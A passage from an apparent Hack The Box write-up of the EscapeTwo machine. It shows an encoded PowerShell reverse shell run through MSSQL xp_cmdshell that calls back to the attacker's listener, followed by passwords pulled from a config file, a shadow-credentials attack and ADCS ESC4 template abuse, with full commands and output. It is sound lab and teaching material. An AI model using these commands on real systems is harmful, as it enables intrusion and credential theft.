+<h3 id="MSSQL-RCE-through-xp-cmdshell"><a href="#MSSQL-RCE-through-xp-cmdshell" class="headerlink" title="MSSQL - RCE through xp_cmdshell"></a>MSSQL - RCE through xp_cmdshell</h3><p>We can now use the sa account to authenticate against the MSSQL server, we can do so using mssqlclient and executing a reverse shell script directly to get access to the system:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec mssql 10.129.68.137 mssql -u sa -p <span class="string">&#x27;MSSQLP@ssw0rd!&#x27;</span> --local-auth -x <span class="string">&#x27;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQA4ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>And we are in:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\foued&gt; nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.18] from (UNKNOWN) [10.129.68.137] 54727</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">sequel\sql_svc</span><br><span class="line">PS C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>As usual, we check configuration files as they might disclose credentials and indeed we found some user credentials:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\SQL2019\ExpressAdv_ENU&gt; <span class="built_in">cat</span> sql<span class="literal">-Configuration</span>.INI</span><br><span class="line">[<span class="type">OPTIONS</span>]</span><br><span class="line">ACTION=<span class="string">&quot;Install&quot;</span></span><br><span class="line">QUIET=<span class="string">&quot;True&quot;</span></span><br><span class="line">FEATURES=SQL</span><br><span class="line">INSTANCENAME=<span class="string">&quot;SQLEXPRESS&quot;</span></span><br><span class="line">INSTANCEID=<span class="string">&quot;SQLEXPRESS&quot;</span></span><br><span class="line">RSSVCACCOUNT=<span class="string">&quot;NT Service\ReportServer<span class="variable">$SQLEXPRESS</span>&quot;</span></span><br><span class="line">AGTSVCACCOUNT=<span class="string">&quot;NT AUTHORITY\NETWORK SERVICE&quot;</span></span><br><span class="line">AGTSVCSTARTUPTYPE=<span class="string">&quot;Manual&quot;</span></span><br><span class="line">COMMFABRICPORT=<span class="string">&quot;0&quot;</span></span><br><span class="line">COMMFABRICNETWORKLEVEL=<span class="string">&quot;&quot;</span><span class="number">0</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">COMMFABRICENCRYPTION=&quot;</span><span class="number">0</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">MATRIXCMBRICKCOMMPORT=&quot;</span><span class="number">0</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">SQLSVCSTARTUPTYPE=&quot;</span>Automatic<span class="string">&quot;</span></span><br><span class="line"><span class="string">FILESTREAMLEVEL=&quot;</span><span class="number">0</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">ENABLERANU=&quot;</span>False<span class="string">&quot;</span></span><br><span class="line"><span class="string">SQLCOLLATION=&quot;</span>SQL_Latin1_General_CP1_CI_AS<span class="string">&quot;</span></span><br><span class="line"><span class="string">SQLSVCACCOUNT=&quot;</span>SEQUEL\sql_svc<span class="string">&quot;</span></span><br><span class="line"><span class="string">SQLSVCPASSWORD=&quot;</span>WqSZAF6CysDQbGb3<span class="string">&quot;</span></span><br><span class="line"><span class="string">SQLSYSADMINACCOUNTS=&quot;</span>SEQUEL\Administrator<span class="string">&quot;</span></span><br><span class="line"><span class="string">SECURITYMODE=&quot;</span>SQL<span class="string">&quot;</span></span><br><span class="line"><span class="string">SAPWD=&quot;</span>MSSQLP@ssw0<span class="built_in">rd</span>!<span class="string">&quot;</span></span><br><span class="line"><span class="string">ADDCURRENTUSERASSQLADMIN=&quot;</span>False<span class="string">&quot;</span></span><br><span class="line"><span class="string">TCPENABLED=&quot;</span><span class="number">1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">NPENABLED=&quot;</span><span class="number">1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">BROWSERSVCSTARTUPTYPE=&quot;</span>Automatic<span class="string">&quot;</span></span><br><span class="line"><span class="string">IAcceptSQLServerLicenseTerms=True</span></span><br><span class="line"><span class="string">PS C:\SQL2019\ExpressAdv_ENU&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We can directly connect with ryan and grep our user flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ evil-winrm -u ryan -p WqSZAF6CysDQbGb3 -i 10.129.68.137</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; <span class="built_in">cd</span> ../desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <span class="built_in">cat</span> user.txt</span><br><span class="line">047bd3b5bf5b32b3d768c6199b070a81</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt;</span><br></pre></td></tr></table></figure></div>
+
+
+<h2 id="Privilege-Escalation-Shadow-Credentials"><a href="#Privilege-Escalation-Shadow-Credentials" class="headerlink" title="Privilege Escalation - Shadow Credentials"></a>Privilege Escalation - Shadow Credentials</h2><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/EscapeTwo/blo.png"
+                      alt="Ryan access"
+                ><figcaption>Ryan access</figcaption></figure></p>
+<p>We can see from bloodhound that we can run like this:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/escapetwo]</span><br><span class="line">└─$ bloodhound-python -u rose -p KxEPkKe6R8su -d sequel.htb -ns 10.129.68.137 --zip</span><br><span class="line">/usr/lib/python3/dist-packages/bloodhound/ad/utils.py:115: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\-&#x27;</span></span><br><span class="line">  xml_sid_rex = re.compile(<span class="string">&#x27;&lt;UserId&gt;(S-[0-9\-]+)&lt;/UserId&gt;&#x27;</span>)</span><br><span class="line">INFO: Found AD domain: sequel.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span><br><span class="line">INFO: Connecting to LDAP server: dc01.sequel.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Found 10 <span class="built_in">users</span></span><br><span class="line">INFO: Connecting to LDAP server: dc01.sequel.htb</span><br><span class="line">INFO: Found 59 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: DC01.sequel.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 10S</span><br><span class="line">INFO: Compressing output into 20250112102408_bloodhound.zip</span><br><span class="line">                                                                                                                                                                               </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/escapetwo]</span><br><span class="line">└─$ </span><br></pre></td></tr></table></figure></div>
+
+<p>That Ryan has WriteOwner on ca_svc. So we can first make ryan owner of ca_svc, add FullControl to him and finally add ShadowCredentials on the DC machine:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/escapetwo]</span><br><span class="line">└─$ bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 <span class="built_in">set</span> owner ca_svc ryan</span><br><span class="line"></span><br><span class="line">[*] Old Security Descriptor: O:S-1-5-21-548670397-972687484-3496335370-512</span><br><span class="line">[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc</span><br><span class="line">                                                                </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/escapetwo]</span><br><span class="line">└─$ python3 dacledit.py -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;FullControl&#x27;</span> -principal <span class="string">&#x27;ryan&#x27;</span> -target <span class="string">&#x27;ca_svc&#x27;</span> <span class="string">&#x27;sequel.htb&#x27;</span>/<span class="string">&#x27;ryan&#x27;</span>:<span class="string">&#x27;WqSZAF6CysDQbGb3&#x27;</span></span><br><span class="line"></span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] DACL backed up to dacledit-20250112-104154.bak</span><br><span class="line">[*] DACL modified successfully!</span><br><span class="line">                                                                                      </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/escapetwo]</span><br><span class="line">└─$ </span><br></pre></td></tr></table></figure></div>
+
+<p>Now we’ll use BloodAD to add shadow credentials and get ca_svc hash:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/escapetwo]</span><br><span class="line">└─$ certipy-ad  shadow auto -u ryan@sequel.htb -p <span class="string">&#x27;WqSZAF6CysDQbGb3&#x27;</span> -dc-ip 10.129.68.137 -ns 10.129.68.137 -target dc01.sequel.htb -account ca_svc</span><br><span class="line"></span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Targeting user <span class="string">&#x27;ca_svc&#x27;</span></span><br><span class="line">[*] Generating certificate</span><br><span class="line">[*] Certificate generated</span><br><span class="line">[*] Generating Key Credential</span><br><span class="line">[*] Key Credential generated with DeviceID <span class="string">&#x27;4b107f50-565a-28ae-463e-88028bbb07d0&#x27;</span></span><br><span class="line">[*] Adding Key Credential with device ID <span class="string">&#x27;4b107f50-565a-28ae-463e-88028bbb07d0&#x27;</span> to the Key Credentials <span class="keyword">for</span> <span class="string">&#x27;ca_svc&#x27;</span></span><br><span class="line">[*] Successfully added Key Credential with device ID <span class="string">&#x27;4b107f50-565a-28ae-463e-88028bbb07d0&#x27;</span> to the Key Credentials <span class="keyword">for</span> <span class="string">&#x27;ca_svc&#x27;</span></span><br><span class="line">[*] Authenticating as <span class="string">&#x27;ca_svc&#x27;</span> with the certificate</span><br><span class="line">[*] Using principal: ca_svc@sequel.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;ca_svc.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;ca_svc&#x27;</span></span><br><span class="line">[*] Restoring the old Key Credentials <span class="keyword">for</span> <span class="string">&#x27;ca_svc&#x27;</span></span><br><span class="line">[*] Successfully restored the old Key Credentials <span class="keyword">for</span> <span class="string">&#x27;ca_svc&#x27;</span></span><br><span class="line">[*] NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;ca_svc&#x27;</span>: 3b181b914e7a9d5508ea1e20bc2b7fce</span><br><span class="line">                                                                                      </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/escapetwo]</span><br><span class="line">└─$ </span><br></pre></td></tr></table></figure></div>
+
+<h3 id="ADCS-Abuse-ESC4"><a href="#ADCS-Abuse-ESC4" class="headerlink" title="ADCS Abuse - ESC4"></a>ADCS Abuse - ESC4</h3><p>We can now use ca_svc to look for vulnerable certificates using certipy:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">                                                                                      </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/escapetwo]</span><br><span class="line">└─$ <span class="built_in">export</span> KRB5CCNAME=ca_svc.ccache </span><br><span class="line">                                                                                      </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/escapetwo]</span><br><span class="line">└─$ certipy-ad  find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 10.129.68.137 -vulnerable -stdout</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[+] Domain retrieved from CCache: SEQUEL.HTB</span><br><span class="line">[+] Username retrieved from CCache: ca_svc</span><br><span class="line">[+] Trying to resolve <span class="string">&#x27;dc01.sequel.htb&#x27;</span> at <span class="string">&#x27;10.129.68.137&#x27;</span></span><br><span class="line">[+] Authenticating to LDAP server</span><br><span class="line">[+] Using Kerberos Cache: ca_svc.ccache</span><br><span class="line">[+] Using TGT from cache</span><br><span class="line">[+] Username retrieved from CCache: ca_svc</span><br><span class="line">[+] Getting TGS <span class="keyword">for</span> <span class="string">&#x27;host/dc01.sequel.htb&#x27;</span></span><br><span class="line">[+] Got TGS <span class="keyword">for</span> <span class="string">&#x27;host/dc01.sequel.htb&#x27;</span></span><br><span class="line">[+] Bound to ldap://10.129.68.137:389 - cleartext</span><br><span class="line">[+] Default path: DC=sequel,DC=htb</span><br><span class="line">[+] Configuration path: CN=Configuration,DC=sequel,DC=htb</span><br><span class="line">[+] Adding Domain Computers to list of current user<span class="string">&#x27;s SIDs</span></span><br><span class="line"><span class="string">[+] List of current user&#x27;</span>s SIDs:</span><br><span class="line">     SEQUEL.HTB\Domain Computers (S-1-5-21-548670397-972687484-3496335370-515)</span><br><span class="line">     SEQUEL.HTB\Denied RODC Password Replication Group (S-1-5-21-548670397-972687484-3496335370-572)</span><br><span class="line">     SEQUEL.HTB\Cert Publishers (S-1-5-21-548670397-972687484-3496335370-517)</span><br><span class="line">     SEQUEL.HTB\Users (SEQUEL.HTB-S-1-5-32-545)</span><br><span class="line">     SEQUEL.HTB\Domain Users (S-1-5-21-548670397-972687484-3496335370-513)</span><br><span class="line">     SEQUEL.HTB\Everyone (SEQUEL.HTB-S-1-1-0)</span><br><span class="line">     SEQUEL.HTB\Authenticated Users (SEQUEL.HTB-S-1-5-11)</span><br><span class="line">     SEQUEL.HTB\Certification Authority (S-1-5-21-548670397-972687484-3496335370-1607)</span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 34 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 12 enabled certificate templates</span><br><span class="line">[+] Trying to resolve <span class="string">&#x27;DC01.sequel.htb&#x27;</span> at <span class="string">&#x27;10.129.68.137&#x27;</span></span><br><span class="line">[*] Trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC01-CA&#x27;</span> via CSRA</span><br><span class="line">[+] Trying to get DCOM connection <span class="keyword">for</span>: 10.129.68.137</span><br><span class="line">[+] Using Kerberos Cache: ca_svc.ccache</span><br><span class="line">[+] Using TGT from cache</span><br><span class="line">[+] Username retrieved from CCache: ca_svc</span><br><span class="line">[+] Getting TGS <span class="keyword">for</span> <span class="string">&#x27;host/DC01.sequel.htb&#x27;</span></span><br><span class="line">[+] Got TGS <span class="keyword">for</span> <span class="string">&#x27;host/DC01.sequel.htb&#x27;</span></span><br><span class="line">[!] Got error <span class="keyword">while</span> trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC01-CA&#x27;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.</span><br><span class="line">[*] Trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC01-CA&#x27;</span> via RRP</span><br><span class="line">[+] Using Kerberos Cache: ca_svc.ccache</span><br><span class="line">[+] Using TGT from cache</span><br><span class="line">[+] Username retrieved from CCache: ca_svc</span><br><span class="line">[+] Getting TGS <span class="keyword">for</span> <span class="string">&#x27;host/DC01.sequel.htb&#x27;</span></span><br><span class="line">[+] Got TGS <span class="keyword">for</span> <span class="string">&#x27;host/DC01.sequel.htb&#x27;</span></span><br><span class="line">[!] Failed to connect to remote registry. Service should be starting now. Trying again...</span><br><span class="line">[+] Connected to remote registry at <span class="string">&#x27;DC01.sequel.htb&#x27;</span> (10.129.68.137)</span><br><span class="line">[*] Got CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC01-CA&#x27;</span></span><br><span class="line">[+] Resolved <span class="string">&#x27;DC01.sequel.htb&#x27;</span> from cache: 10.129.68.137</span><br><span class="line">[+] Connecting to 10.129.68.137:80</span><br><span class="line">[*] Enumeration output:</span><br><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : sequel-DC01-CA</span><br><span class="line">    DNS Name                            : DC01.sequel.htb</span><br><span class="line">    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb</span><br><span class="line">    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3</span><br><span class="line">    Certificate Validity Start          : 2024-06-08 16:50:40+00:00</span><br><span class="line">    Certificate Validity End            : 2124-06-08 17:00:40+00:00</span><br><span class="line">    Web Enrollment                      : Disabled</span><br><span class="line">    User Specified SAN                  : Disabled</span><br><span class="line">    Request Disposition                 : Issue</span><br><span class="line">    Enforce Encryption <span class="keyword">for</span> Requests     : Enabled</span><br><span class="line">    Permissions</span><br><span class="line">      Owner                             : SEQUEL.HTB\Administrators</span><br><span class="line">      Access Rights</span><br><span class="line">        ManageCertificates              : SEQUEL.HTB\Administrators</span><br><span class="line">                                          SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">        ManageCa                        : SEQUEL.HTB\Administrators</span><br><span class="line">                                          SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">        Enroll                          : SEQUEL.HTB\Authenticated Users</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : DunderMifflinAuthentication</span><br><span class="line">    Display Name                        : Dunder Mifflin Authentication</span><br><span class="line">    Certificate Authorities             : sequel-DC01-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : False</span><br><span class="line">    Certificate Name Flag               : SubjectRequireCommonName</span><br><span class="line">                                          SubjectAltRequireDns</span><br><span class="line">    Enrollment Flag                     : AutoEnrollment</span><br><span class="line">                                          PublishToDs</span><br><span class="line">    Private Key Flag                    : 16842752</span><br><span class="line">    Extended Key Usage                  : Client Authentication</span><br><span class="line">                                          Server Authentication</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 1000 years</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 2048</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : SEQUEL.HTB\Enterprise Admins</span><br><span class="line">        Full Control Principals         : SEQUEL.HTB\Cert Publishers</span><br><span class="line">        Write Owner Principals          : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">                                          SEQUEL.HTB\Administrator</span><br><span class="line">                                          SEQUEL.HTB\Cert Publishers</span><br><span class="line">        Write Dacl Principals           : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">                                          SEQUEL.HTB\Administrator</span><br><span class="line">                                          SEQUEL.HTB\Cert Publishers</span><br><span class="line">        Write Property Principals       : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">                                          SEQUEL.HTB\Administrator</span><br><span class="line">                                          SEQUEL.HTB\Cert Publishers</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC4                              : <span class="string">&#x27;SEQUEL.HTB\\Cert Publishers&#x27;</span> has dangerous permissions</span><br><span class="line">            </span><br></pre></td></tr></table></figure></div>
+
+<p>ESC4 is when there are weak access controls on a certificate template. We can see that the Certificate Publishers has full control over the Dunder Mifflin Authentication template.</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/escapetwo]</span><br><span class="line">└─$ certipy-ad  template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.129.68.137 </span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Updating certificate template <span class="string">&#x27;DunderMifflinAuthentication&#x27;</span></span><br><span class="line">[*] Successfully updated <span class="string">&#x27;DunderMifflinAuthentication&#x27;</span></span><br><span class="line">         </span><br></pre></td></tr></table></figure></div>
+
+
+<p>And now we’re going to request a certificate for the administrator:</p>
